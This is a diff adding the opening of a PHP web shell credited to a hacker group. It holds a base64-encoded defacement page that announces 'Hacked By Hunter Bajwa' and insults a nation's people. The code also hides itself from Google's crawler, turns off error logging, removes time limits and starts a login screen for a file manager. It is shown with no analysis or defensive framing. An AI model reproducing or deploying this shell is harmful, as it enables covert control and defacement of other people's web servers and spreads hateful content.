@@ -1,0 +1,1250 @@
+<?pHp
+/*
+            //++++++++======= Shell Made By Hunter Bajwa :) =======++++++++ //
+             //++++++++=======        Special Thanks to:      =======++++++++ //
+ 
+              https://www.facebook.com/HunterBajwaOfficial/
+              https://www.facebook.com/BlackLeets1337/
+ 
+                                   //  Hope You Dont Edit iT :)  //
+*/
+$auth_pass= "";         //Guess iT :V :v :V
+$deface = 'CjwhRE9DVFlQRSBodG1sPgo8aHRtbD4KCjxoZWFkPgoJPHRpdGxlPkhhY2tlZCBCeSBIdW50ZXIgQmFqd2E8L3RpdGxlPgoJPGVtYmVkIHNyYz0iW2NvbG9yPSNGRjAwMDBdaHR0cHM6Ly93d3cueW91dHViZS5jb20vdi9sQnVMVWlkUjlyMCZhdXRvcGxheT0xWy9jb2xvcl0iIHR5cGU9ImFwcGxpY2F0aW9uL3gtc2hvY2t3YXZlLWZsYXNoIiB3bW9kZT10cmFuc3BhcmVudCB3aWR0aD0xIGhlaWdodD0xPjwvZW1iZWQ+Cgk8bGluayByZWw9IlNIT1JUQ1VUIElDT04iIGhyZWY9Imh0dHA6Ly93d3cuaWNvbnNkYi5jb20vaWNvbnMvZG93bmxvYWQvYmxhY2svc2t1bGwtNjEtMTI4LmljbyIgdHlwZT0iaW1hZ2UvZ2lmIj4KCTxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KCTxtZXRhIG5hbWU9IkF1dGhvciIgY29udGVudD0iLi9IdW50ZXJfQmFqd2Egd2FzIEhlcmUhISEiLz4KCTxtZXRhIG5hbWU9ImNvcHlyaWdodCIgY29udGVudD0iLi9IdW50ZXJfQmFqd2Egd2FzIEhlcmUhISEiLz4KCTxtZXRhIG5hbWU9ImRlc2NyaXB0aW9uIiBjb250ZW50PSJXZWJzaXRlIFB3bmVkIGJ5IEh1bnRlciBCYWp3YSIvPgoJPGxpbmsgaHJlZj0naHR0cDovL2ZvbnRzLmdvb2dsZWFwaXMuY29tL2Nzcz9mYW1pbHk9SWNlbGFuZDo0MDAsNzAwJyByZWw9J3N0eWxlc2hlZXQnIHR5cGU9J3RleHQvY3NzJz4KCTxsaW5rIGhyZWY9J2h0dHA6Ly9mb250cy5nb29nbGVhcGlzLmNvbS9jc3M/ZmFtaWx5PUljZWxhbmQ6NDAwLDcwMCcgcmVsPSdzdHlsZXNoZWV0JyB0eXBlPSd0ZXh0L2Nzcyc+Cgk8bWV0YSBwcm9wZXJ0eT0ib2c6aW1hZ2UiIGNvbnRlbnQ9IiI+CiAgCQk8c3R5bGUgdHlwZT0idGV4dC9jc3MiPgoJCQlib2R5IHsKCQkJCW92ZXJmbG93OmhpZGRlbjsKCQkJCWJhY2tncm91bmQtaW1hZ2U6dXJsKCcnKTsKCQkJCWJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7CgkJCQliYWNrZ3JvdW5kLXJlcGVhdDpuby1yZXBlYXQ7CgkJCQliYWNrZ3JvdW5kLXNpemU6IDEwMCUgOwoJCQkJYmFja2dyb3VuZC1wb3NpdGlvbjp0b3AgY2VudGVyOwoJCQkJbWFyZ2luOiAwcHg7CgkJCQljdXJzb3I6bm9uZTsKCQkJCWZvbnQtZmFtaWx5OiBJY2VsYW5kLCBzYW5zLXNlcmlmOwoJCQl9CgkJCWF7CgkJCQl0ZXh0LWRlY29yYXRpb246IG5vbmU7CgkJCX0KCQkJaDF7CgkJCWZvbnQtZmFtaWx5OiBJY2VsYW5kLCBzYW5zLXNlcmlmOwoJCQlmb250LXNpemU6OTBweDsKCQkJY29sb3I6I2ZmZjsKCQkJbWFyZ2luOjBweCAwcHggMHB4OwoJCQkKCQkJfQoJCQloMnsKCQkJZm9udC1mYW1pbHk6IEljZWxhbmQsIHNhbnMtc2VyaWY7CgkJCWZvbnQtc2l6ZTo0MHB4OwoJCQljb2xvcjojMDAwOwoJCQltYXJnaW46IDBweDsKCQkJdGV4dC1zaGFkb3c6IDAgMCAzcHggI2ZmZjsKCQkJCgkJCX0KCQkJcHsKCQkJY29sb3I6IzAwMDsKCQkJZm9udC1zaXplOjI1cHg7CgkJCW1hcmdpbjogMHB4OwoJCQl0ZXh0LXNoYWRvdzogMCAwIDNweCAjZmZmOwoKCQkJfQoJCQkuZm90ewoJCQlmb250LWZhbWlseTogSWNlbGFuZCwgc2Fucy1zZXJpZjsKCQkJZm9udC1zaXplOjE0cHg7CgkJCWNvbG9yOiNmZmY7CgkJCW1hcmdpbjogMHB4OwoJCQl0ZXh0LXNoYWRvdzogMCAwIDNweCAjMDAwLCAwcHggMHB4IDVweCAjMDAwOwoJCQl9CgkJCSBoMXsKCQkJY29sb3I6IzAwMDsKCQkJdGV4dC1zaGFkb3c6IDAgMCA1cHggI2ZmZjsKCQl9CgkJLmdyZWV0c3sKCWZvbnQtZmFtaWx5OiBBcmlhbCwgc2Fucy1zZXJpZjsKCWxpbmUtaGVpZ2h0OiAyNHB4OwoJZm9udC1zaXplOiAxMXB4OwoJd2lkdGg6IDUwJTsKCWJhY2tncm91bmQ6ICMwMDA7CglvcGFjaXR5OiAwLjk7Cgl0ZXh0LXRyYW5zZm9ybTogdXBwZXJjYXNlOwoJei1pbmRleDogOTk5OTsKCWJvcmRlci1yYWRpdXM6MTBweDsKCS1tb3otYm94LXNoYWRvdzogMXB4IDBweCAycHggIzAwMDsKCS13ZWJraXQtYm94LXNoYWRvdzogMXB4IDBweCAycHggIzAwMDsKCWJveC1zaGFkb3c6IDFweCAwcHggMnB4ICMwMDA7Cn0KCQk8L3N0eWxlPgoJPC9oZWFkPiAKCTxkaXYgaWQ9IkkzMDFfaHRtbCI+Cgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCIgc3JjPSJodHRwOi8vY29kZS5qcXVlcnkuY29tL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgoKPHNjcmlwdCB0eXBlPSJ0ZXh0L2phdmFzY3JpcHQiPnNldFRpbWVvdXQoIiQoJyNsb2FkaW5nJykuZmFkZU91dCg1MDAwKTsiLCAxMDAwMCk7ICA8L3NjcmlwdD4KCjxzdHlsZSB0eXBlPSJ0ZXh0L2NzcyI+I2xvYWRpbmd7cG9zaXRpb246Zml4ZWQ7dG9wOjA7bGVmdDowO3BhZGRpbmctdG9wOjBweDtiYWNrZ3JvdW5kLWNvbG9yOiMwMDA7d2lkdGg6MTAwJTtoZWlnaHQ6MTAwJTtjb2xvcjpibGFjazt6LWluZGV4OjkwMDA7b3ZlcmZsb3c6aGlkZGVuO308L3N0eWxlPgogCjxkaXYgaWQ9ImxvYWRpbmciPgo8Ym9keSBvbmxvYWQ9ImRvY3VtZW50LmYucC5mb2N1cygpIiB0b3BtYXJnaW49IjAiIGxlZnRtYXJnaW49IjAiIGJnY29sb3I9IiMwMDAwMDAiIG1hcmdpbmhlaWdodD0iMCIgbWFyZ2lud2lkdGg9IjAiPgo8dGFibGUgYm9yZGVyPSIwIiBjZWxscGFkZGluZz0iMiIgY2VsbHNwYWNpbmc9IjAiIHdpZHRoPSIxMDAlIj4KPHRib2R5Pjx0cj4gCgoKPC90cj4KCQo8dHI+CgoKCjwvdHI+CjwvdGJvZHk+PC90YWJsZT4gCjxmb250IGlkPSJSZXNwb25zZURhdGEiIGNvbG9yPSIjZmY5OWNjIj4KPHByZT48c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+ClR5cGluZ1RleHQgPSBmdW5jdGlvbihlbGVtZW50LCBpbnRlcnZhbCwgY3Vyc29yLCBmaW5pc2hlZENhbGxiYWNrKSB7CiAgaWYoKHR5cGVvZiBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCA9PSAidW5kZWZpbmVkIikgfHwgKHR5cGVvZiBlbGVtZW50LmlubmVySFRNTCA9PSAidW5kZWZpbmVkIikpIHsKICAgIHRoaXMucnVubmluZyA9IHRydWU7CS8vIE5ldmVyIHJ1bi4KICAgIHJldHVybjsKICB9CiAgdGhpcy5lbGVtZW50ID0gZWxlbWVudDsKICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2sgPSAoZmluaXNoZWRDYWxsYmFjayA/IGZpbmlzaGVkQ2FsbGJhY2sgOiBmdW5jdGlvbigpIHsgcmV0dXJuOyB9KTsKICB0aGlzLmludGVydmFsID0gKHR5cGVvZiBpbnRlcnZhbCA9PSAidW5kZWZpbmVkIiA/IDEwMCA6IGludGVydmFsKTsKICB0aGlzLm9yaWdUZXh0ID0gdGhpcy5lbGVtZW50LmlubmVySFRNTDsKICB0aGlzLnVucGFyc2VkT3JpZ1RleHQgPSB0aGlzLm9yaWdUZXh0OwogIHRoaXMuY3Vyc29yID0gKGN1cnNvciA/IGN1cnNvciA6ICIiKTsKICB0aGlzLmN1cnJlbnRUZXh0ID0gIiI7CiAgdGhpcy5jdXJyZW50Q2hhciA9MDsKICB0aGlzLmVsZW1lbnQudHlwaW5nVGV4dCA9IHRoaXM7CiAgaWYodGhpcy5lbGVtZW50LmlkID09ICIiKSB0aGlzLmVsZW1lbnQuaWQgPSAidHlwaW5ndGV4dCIgKyBUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCsrOwogIFR5cGluZ1RleHQuYWxsLnB1c2godGhpcyk7CiAgdGhpcy5ydW5uaW5nID0gZmFsc2U7CiAgdGhpcy5pblRhZyA9IGZhbHNlOwogIHRoaXMudGFnQnVmZmVyID0gIiI7CiAgdGhpcy5pbkhUTUxFbnRpdHkgPSBmYWxzZTsKICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiIjsKfQpUeXBpbmdUZXh0LmFsbCA9IG5ldyBBcnJheSgpOwpUeXBpbmdUZXh0LmN1cnJlbnRJbmRleCA9IDA7ClR5cGluZ1RleHQucnVuQWxsID0gZnVuY3Rpb24oKSB7CiAgZm9yKHZhciBpID0gMDsgaSA8IFR5cGluZ1RleHQuYWxsLmxlbmd0aDsgaSsrKSBUeXBpbmdUZXh0LmFsbFtpXS5ydW4oKTsKfQpUeXBpbmdUZXh0LnByb3RvdHlwZS5ydW4gPSBmdW5jdGlvbigpIHsKICBpZih0aGlzLnJ1bm5pbmcpIHJldHVybjsKICBpZih0eXBlb2YgdGhpcy5vcmlnVGV4dCA9PSAidW5kZWZpbmVkIikgewogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwkvLyBXZSBoYXZlbid0IGZpbmlzaGVkIGxvYWRpbmcgeWV0LiAgSGF2ZSBwYXRpZW5jZS4KICAgIHJldHVybjsKICB9CiAgaWYodGhpcy5jdXJyZW50VGV4dCA9PSAiIikgdGhpcy5lbGVtZW50LmlubmVySFRNTCA9ICIiOwovLyAgdGhpcy5vcmlnVGV4dCA9IHRoaXMub3JpZ1RleHQucmVwbGFjZSgvPChbXjxdKSo+LywgIiIpOyAgICAgLy8gU3RyaXAgSFRNTCBmcm9tIHRleHQuCiAgaWYodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoKSB7CiAgICBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPCIgJiYgIXRoaXMuaW5UYWcpIHsKICAgICAgdGhpcy50YWdCdWZmZXIgPSAiPCI7CiAgICAgIHRoaXMuaW5UYWcgPSB0cnVlOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKSA9PSAiPiIgJiYgdGhpcy5pblRhZykgewogICAgICB0aGlzLnRhZ0J1ZmZlciArPSAiPiI7CiAgICAgIHRoaXMuaW5UYWcgPSBmYWxzZTsKICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLnRhZ0J1ZmZlcjsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5pblRhZykgewogICAgICB0aGlzLnRhZ0J1ZmZlciArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIiYiICYmICF0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgPSAiJiI7CiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gdHJ1ZTsKICAgICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgICB0aGlzLnJ1bigpOwogICAgICByZXR1cm47CiAgICB9IGVsc2UgaWYodGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcikgPT0gIjsiICYmIHRoaXMuaW5IVE1MRW50aXR5KSB7CiAgICAgIHRoaXMuSFRNTEVudGl0eUJ1ZmZlciArPSAiOyI7CiAgICAgIHRoaXMuaW5IVE1MRW50aXR5ID0gZmFsc2U7CiAgICAgIHRoaXMuY3VycmVudFRleHQgKz0gdGhpcy5IVE1MRW50aXR5QnVmZmVyOwogICAgICB0aGlzLmN1cnJlbnRDaGFyKys7CiAgICAgIHRoaXMucnVuKCk7CiAgICAgIHJldHVybjsKICAgIH0gZWxzZSBpZih0aGlzLmluSFRNTEVudGl0eSkgewogICAgICB0aGlzLkhUTUxFbnRpdHlCdWZmZXIgKz0gdGhpcy5vcmlnVGV4dC5jaGFyQXQodGhpcy5jdXJyZW50Q2hhcik7CiAgICAgIHRoaXMuY3VycmVudENoYXIrKzsKICAgICAgdGhpcy5ydW4oKTsKICAgICAgcmV0dXJuOwogICAgfSBlbHNlIHsKICAgICAgdGhpcy5jdXJyZW50VGV4dCArPSB0aGlzLm9yaWdUZXh0LmNoYXJBdCh0aGlzLmN1cnJlbnRDaGFyKTsKICAgIH0KICAgIHRoaXMuZWxlbWVudC5pbm5lckhUTUwgPSB0aGlzLmN1cnJlbnRUZXh0OwogICAgdGhpcy5lbGVtZW50LmlubmVySFRNTCArPSAodGhpcy5jdXJyZW50Q2hhciA8IHRoaXMub3JpZ1RleHQubGVuZ3RoIC0gMSA/ICh0eXBlb2YgdGhpcy5jdXJzb3IgPT0gImZ1bmN0aW9uIiA/IHRoaXMuY3Vyc29yKHRoaXMuY3VycmVudFRleHQpIDogdGhpcy5jdXJzb3IpIDogIiIpOwogICAgdGhpcy5jdXJyZW50Q2hhcisrOwogICAgc2V0VGltZW91dCgiZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJyIgKyB0aGlzLmVsZW1lbnQuaWQgKyAiJykudHlwaW5nVGV4dC5ydW4oKSIsIHRoaXMuaW50ZXJ2YWwpOwogIH0gZWxzZSB7Cgl0aGlzLmN1cnJlbnRUZXh0ID0gIiI7Cgl0aGlzLmN1cnJlbnRDaGFyID0gMDsKICAgICAgICB0aGlzLnJ1bm5pbmcgPSBmYWxzZTsKICAgICAgICB0aGlzLmZpbmlzaGVkQ2FsbGJhY2soKTsKICB9Cn0KPC9zY3JpcHQ+CjxzY3JpcHQ+CmZ1bmN0aW9uIGRpc2FibGVzZWxlY3QoZSl7cmV0dXJuIGZhbHNlfQoKZnVuY3Rpb24gcmVFbmFibGUoKXtyZXR1cm4gdHJ1ZX0KCi8vaWYgSUU0Kwpkb2N1bWVudC5vbnNlbGVjdHN0YXJ0PW5ldyBGdW5jdGlvbiAoInJldHVybiBmYWxzZSIpCgovL2lmIE5TNgppZiAod2luZG93LnNpZGViYXIpewpkb2N1bWVudC5vbm1vdXNlZG93bj1kaXNhYmxlc2VsZWN0CmRvY3VtZW50Lm9uY2xpY2s9cmVFbmFibGUKfQo8L3NjcmlwdD4KPHNjcmlwdD4KdmFyIG1lc3NhZ2U9IiI7CmZ1bmN0aW9uIGNsaWNrSUUoKQoKe2lmIChkb2N1bWVudC5hbGwpCnsobWVzc2FnZSk7cmV0dXJuIGZhbHNlO319CgpmdW5jdGlvbiBjbGlja05TKGUpIHsKaWYKKGRvY3VtZW50LmxheWVyc3x8KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkJiYhZG9jdW1lbnQuYWxsKSkKewppZiAoZS53aGljaD09Mnx8ZS53aGljaD09MykgeyhtZXNzYWdlKTtyZXR1cm4gZmFsc2U7fX19CmlmIChkb2N1bWVudC5sYXllcnMpCntkb2N1bWVudC5jYXB0dXJlRXZlbnRzKEV2ZW50Lk1PVVNFRE9XTik7ZG9jdW1lbnQuICBvbm1vdXNlZG93bj1jbGlja05TO30KZWxzZQp7ZG9jdW1lbnQub25tb3VzZXVwPWNsaWNrTlM7ZG9jdW1lbnQub25jb250ZXh0bWVudSAgPWNsaWNrSUU7fQoKZG9jdW1lbnQub25jb250ZXh0bWVudT1uZXcgRnVuY3Rpb24oInJldHVybiBmYWxzZSIpCjwvc2NyaXB0PgoKPHRhYmxlIHN0eWxlPSIgYmFja2dyb3VuZC1yZXBlYXQ6IG5vLXJlcGVhdDsiICBhbGlnbj0icmlnaHQiIGJvcmRlcj0iMCIgd2lkdGg9IjEwMCUiID4KCjxicj4KCjx0Ym9keT48dHI+Cjx0ZCAgdmFsaWduPSJ0b3AiPjxwIGlkPSJoYWNrIiA+Cgo8YnIgLz4KPGJyPgo8Zm9udCBjb2xvcj0iR3JlZW4iPiAmbmJzcDsmbmJzcDsmbmJzcDsmbmJzcDs8Yj5bK11IdW50ZXIgQmFqd2Egd2FzIEhlcmUhISAgICAgICAgPC9mb250PiA8YnI+Cjxmb250IGNvbG9yPSJHcmVlbiI+ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzxiPlsrXURlYXIgTXIuQWRtaW5pc3RyYXRvciAgIDwvZm9udD48YnI+Cjxmb250IGNvbG9yPSJHcmVlbiI+ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzxiPlsrXVBsZWFzZSBQYXRjaCB5b3VyIFN5c3RlbTwvZm9udD48YnI+Cjxmb250IGNvbG9yPSJHcmVlbiI+ICZuYnNwOyZuYnNwOyZuYnNwOyZuYnNwOzxiPlsrXSB+IC4vSHVudGVyX0JhandhICAgICAgICA8L2ZvbnQ+IDxicj4KCQkJCQkgPGZvbnQgY29sb3I9IkdyZWVuIj4gCgkKICAgICAgICAgIAo8L3A+PC90cj4KPC90Ym9keT48L3RhYmxlPiAgICAgICAgICAgICAgICAgPC9kaXY+IAo8YnI+Cgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Cm5ldyBUeXBpbmdUZXh0KGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCJoYWNrIiksIDUwLCBmdW5jdGlvbihpKXsgdmFyIGFyID0gbmV3IEFycmF5KCJfIiwiIik7IHJldHVybiAiICIgKyBhcltpLmxlbmd0aCAlIGFyLmxlbmd0aF07IH0pOwpUeXBpbmdUZXh0LnJ1bkFsbCgpOwoKPC9zY3JpcHQ+CgogICAgPHN0eWxlPiAKIAogICAgICB0ZAogCiAgICAgIHsKIAogICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDAwMDA7CiAKICAgICAgICBmb250LWZhbWlseTogQ291cmllciBOZXc7CiAKICAgICAgICBmb250LXNpemU6MjBweDsKIAogICAgICAgIGNvbG9yOiMwMDAwMDA7CiAKICAgICAgICBib3JkZXItY29sb3I6ICMwMDAwMDA7CiAKICAgICAgICBib3JkZXItd2lkdGg6MXB0OwogCiAgICAgICAgYm9yZGVyLXN0eWxlOnNvbGlkOwogCiAgICAgICAgYm9yZGVyLWNvbGxhcHNlOmNvbGxhcHNlOwogCiAgICAgICAgcGFkZGluZzowcHQgM3B0OwogCiAgICAgICAgdmVydGljYWwtYWxpZ246dG9wOwogCiAgICAgIH0KIAogICAgICB0YWJsZQogCiAgICAgIHsKIAogICAgICAgIGJvcmRlci1jb2xvcjogIzg4YWFjZTsKIAogICAgICAgIGJvcmRlci13aWR0aDowcHQgMXB0OwogCiAgICAgICAgYm9yZGVyLXN0eWxlOmRhc2g7CiAKICAgICAgfQogCiAgICAgIEE6TGluaywgQTpWaXNpdGVkCiAKICAgICAgewogCiAgICAgICAgY29sb3I6ICM4OGFhY2U7CiAKICAgICAgfQogCiAgICAgIEEubm86TGluaywgQS5ubzpWaXNpdGVkCiAKICAgICAgewogCiAgICAgICAgY29sb3I6ICM4OGFhY2U7CiAKICAgICAgICB0ZXh0LWRlY29yYXRpb246IG5vbmU7CiAKICAgICAgfQogCiAgICAgIEE6SG92ZXIsIEE6VmlzaXRlZDpIb3ZlciAsIEEubm86SG92ZXIsIEEubm86VmlzaXRlZDpIb3ZlcgogCiAgICAgIHsKIAogICAgICAgIGNvbG9yOiAjODhhYWNlOwogCiAgICAgICAgYmFja2dyb3VuZC1jb2xvcjojMmUyZTJlOwogCiAgICAgICAgdGV4dC1kZWNvcmF0aW9uOgogCiAgICAgICAgb3ZlcmxpbmUgdW5kZXJsaW5lOwogCiAgICAgIH0KIAogICAgICAuc3R5bGUxCiAKICAgICAgewogCiAgICAgICAgY29sb3I6ICM4OGFhY2UKIAogICAgICB9CiAKICAgICAgLnN0eWxlMgogCiAgICAgIHsKIAogICAgICAgIGNvbG9yOiAxZjFmMWYKIAogICAgICB9CiAKICAgICAgYm9keQogCiAgICAgIHsKIAogICAgICAgIGNvbG9yOndoaXRlOwogICAgICAgICAKICAgICAgICBiYWNrZ3JvdW5kLXBvc2l0aW9uOnJpZ2h0OwogCiAgICAgICAgYmFja2dyb3VuZC1hdHRhY2htZW50OmZpeGVkOwogCiAgICAgICAgPC9kaXY+CiAKICAgICAgfQogCiAgICA8L3N0eWxlPgogICAgICAgIAogCjwvZGl2PgoKPC9kaXY+Cjxib2R5IG9uY29udGV4dG1lbnU9InJldHVybiBmYWxzZSIgb25rZXlkb3duPSJyZXR1cm4gZmFsc2UiPgo8Y2VudGVyPgo8aDIgY2xhc3M9Imdsb3ciPkhhY2tlZCBCeSBIdW50ZXIgQmFqd2E8L2gyPgo8aW1nIHNyYz0iaHR0cHM6Ly9pLndhcm9zdS5vcmcvZGF0YS9zY2kvaW1nLzAwNzQvMjkvMTQzODE5OTgzMDAxNi5wbmciIHdpZHRoPSIyMCUiPgo8aDIgY2xhc3M9Imdsb3cyIiA+Ljo6VGVhbSBCbGFja0xlZXRzOjouPGJyPiA8YSBocmVmPSJodHRwczovL3d3dy5mYWNlYm9vay5jb20vQmxhY2tMZWV0czEzMzcvIj5PZmZpY2lhbCBQYWdlIDwvYT48YnI+PGEgaHJlZj0iaHR0cHM6Ly93d3cuZmFjZWJvb2suY29tL0h1bnRlckJhandhT2ZmaWNpYWwvIj5IdW50ZXIgQmFqd2EgT2ZmaWNpYWwgUGFnZSA8L2E+PC9wPjwvYj48L2gyPgo8cD48Yj5Zb3VyIFNpdGUncyBTZWN1cml0eSBIYXMgQmVlbiBGVUNLRUQgPHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OkljZWxhbmQ7Y29sb3I6cmVkO3RleHQtc2hhZG93OnJlZCAwcHggMHB4IDNweCI+Li9IdW50ZXIgQmFqd2EgPC9zcGFuPgoJCQkjTWlzc2lvbl9ZZXMtVG9pbGV0cyA8Zm9udCBzdHlsZT0iY29sb3I6cmVkO3RleHQtc2hhZG93OiMwMDAgMHB4IDBweCAzcHgiPkVuZ2FnZWQ8L2ZvbnQ+IFRoYXQgb25lIHBvb3IgY291bnRyeSB3aXRoIGdheSBmb3VuZGVyLiBUaGF0IG9uZSBQb29yIENvdW50cnkgd2l0aCBDaG90aSBDaG90aSBMdWxpeWFhbiAoR09vZ2xlIGl0KQpUaGF0IG9uZSBQb29yIENvdW50cnkgd2l0aCBzdHVwaWQgUHJpbWUgTWluaXN0ZXIgKEdvb2dsZSBpdCkuClRoYXQgb25lIHBvb3IgY291bnRyeSB3aG8gY2FuJ3QgQWZmb3JkIHNuYXBjaGF0IDpWClRoYXQgb25lIHBvb3IgY291bnRyeSB3aXRoIGNoYWlsd2FsYSBwbS4KdGhhdCBvbmUgcG9vciBjb3VudHJ5IHBlb3BsZSB3aG8gcG9vcCBvbiByYWlsd2F5cyA6VgoKCgkJICAgIDwvcD4KCQk8L3NwYW4+CgkJCTxkaXYgc3R5bGU9ImZvbnQtc2l6ZToxMHB4O2NvbG9yOmdvbGQ7dGV4dC1zaGFkb3c6Z3JleSAwcHggMHB4IDNweCI+CgkJPHNwYW4gc3R5bGU9ImZvbnQtZmFtaWx5OkljZWxhbmQ7Zm9udC13ZWlnaHQ6Ym9sZDtjb2xvcjojZmZmZmZmIj48cD5+U0VDVVJJVFkgSVMgSlVTVCBBTiBJTExVU0lPTn48L3A+PC9zcGFuPgoJPC9kaXY+CiAKPGRpdiBjbGFzcz0iZ3JlZXRzIj4KPHRhYmxlIGFsaWduPWNlbnRlciBib3JkZXI9IjAiPgo8dHI+Cjx0ZCB3aWR0aD0xMDAlIGlkPWdyZWV0ej4KPG1hcnF1ZWUgYmVoYXZpb3I9InNjcm9sbCIgZGlyZWN0aW9uPSJsZWZ0IiBzY3JvbGxhbW91bnQ9IjQiIHNjcm9sbGRlbGF5PSI1NSIgd2lkdGg9IjEwMCUiPgo8Zm9udCBzaXplPSI1cHgiIHN0eWxlPSJmb250LWZhbWlseTogSWNlbGFuZCwgc2Fucy1zZXJpZjtjb2xvcjpibGFjazt0ZXh0LXNoYWRvdzogMCAwIDNweCByZWQsIDBweCAwcHggNXB4IHJlZCIgPgo8Yj4tPXwgR3JlZXR6IHRvIHxIdW50ZXIgQmFqd2EgfHwgUmpfZDN8fCBYYW0gM3hQbG9pVGVSIHx8ICBCbGFja2hhdHRpZ2VyIHx8IEh1bnRlciBNYWZpYSBEb24gfCBEMyBEYXNpbiB8fCBMM0czbkQgSyExMTNSIHx8IFJASDMzTV9IYXhvciB8Li4uIEFuZCBBbGwgUGFraXN0YW5pIEhhY2tlcnMgundefinedCB8PC9mb250Pgo8L21hcnF1ZWU+CjwvdGQ+CjwvdGFibGU+PC9kaXY+IAo8ZGl2IGNsYXNzPSJmb3QiPgpDb3B5cmlnaHRzICZjb3B5OyBINElEM3IKPC9kaXY+CjwvY2VudGVyPgo8c2NyaXB0IHR5cGU9InRleHQvamF2YXNjcmlwdCI+Ci8vPCFbQ0RBVEFbCihmdW5jdGlvbigpIHsKdmFyIF9hbmFseXRpY3Nfc2NyID0gZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgnc2NyaXB0Jyk7Cl9hbmFseXRpY3Nfc2NyLnR5cGUgPSAndGV4dC9qYXZhc2NyaXB0JzsgX2FuYWx5dGljc19zY3IuYXN5bmMgPSB0cnVlOyBfYW5hbHl0aWNzX3Njci5zcmMgPSAnL19JbmNhcHN1bGFfUmVzb3VyY2U/U1dKSVlMV0E9Mjk3N2Q4ZDc0ZjYzZDdmOGZlZGJlYTAxOGI3YTFkMDUmbnM9MSc7CnZhciBfYW5hbHl0aWNzX2VsZW0gPSBkb2N1bWVudC5nZXRFbGVtZW50c0J5VGFnTmFtZSgnc2NyaXB0JylbMF07IF9hbmFseXRpY3NfZWxlbS5wYXJlbnROb2RlLmluc2VydEJlZm9yZShfYW5hbHl0aWNzX3NjciwgX2FuYWx5dGljc19lbGVtKTsKfSkoKTsKLy8gXV0+Cjwvc2NyaXB0PjwvYm9keT4=';  //deface in base64.
+                                //Change Shell Theme here//
+$color = "#ABEFFF";                                   //Fonts color modify here.
+$Theme = '#09B5A6';                                    //Change border-color accoriding to your choice.
+$TabsColor = '#0E5061';                              //Change tabs color here.
+$default_action = 'FilesMan';
+@define('SELF_PATH', __FILE__);
+if( strpos($_SERVER['HTTP_USER_AGENT'],'Google') !== false ) {
+    header('HTTP/1.0 404 Not Found');
+    exit;
+}
+ 
+@session_start();
+@error_reporting(0);
+@ini_set('error_log',NULL);
+@ini_set('display_errors',0);
+@ini_set('log_errors',0);
+@ini_set('max_execution_time',0);
+@set_time_limit(0);
+@set_magic_quotes_runtime(0);
+if( get_magic_quotes_gpc() ) {
+    function stripslashes_array($array) {
+        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);
+    }
+    $_POST = stripslashes_array($_POST);
+}
+ 
+function HunterBajwalogin() {
+    die ('<!DOCTYPE html>
+<html>
+    <head>
+        <title>Hunter Bajwa</title>
+        <meta charset="UTF-8">
+        <meta http-equiv="refresh" content=""> <!-- For Refreshing after ____ interval of time -->
+        <meta name="description" content="Sites description">
+        <meta name="about" content="Made By Hunter Bajwa">
+        <link href="http://i.imgur.com/wJDvuRs.png" rel="Shortcut Icon" />
+        <meta name="description" content="For Logging into the system">
+        <style>
+            .body {
+                margin-top: 7vh;
+                text-transform: capitalize;            
+                background: black url("http://i.imgur.com/vRlLG1T.jpg");
+                background-repeat:no-repeat;
+                background-position: center;
+                background-attachment: fixed;
+                -webkit-background-size: cover;
+                -moz-background-size: cover;
+                -o-background-size: cover;
+                background-size: cover;
+            }
+            .font {
+                font-family: calibri;
+                font-size: 300%;
+                text-align: center;
+                color: white;
+            }
+            .upass {
+                margin-top: 70vh;
+                font-family: calibri;
+                font-size: 100%;
+                text-align: center;
+                color: black;
+            }
+            .input {
+                margin:0;background-color:black;border:1px solid black;
+            }
+        </style>
+        <script language="JavaScript1.2">
+            function ejs_nodroit(){
+                alert("Login Please!");
+                return(false);
+            }
+            document.oncontextmenu = ejs_nodroit;
+        </script>
+    </head>
+ 
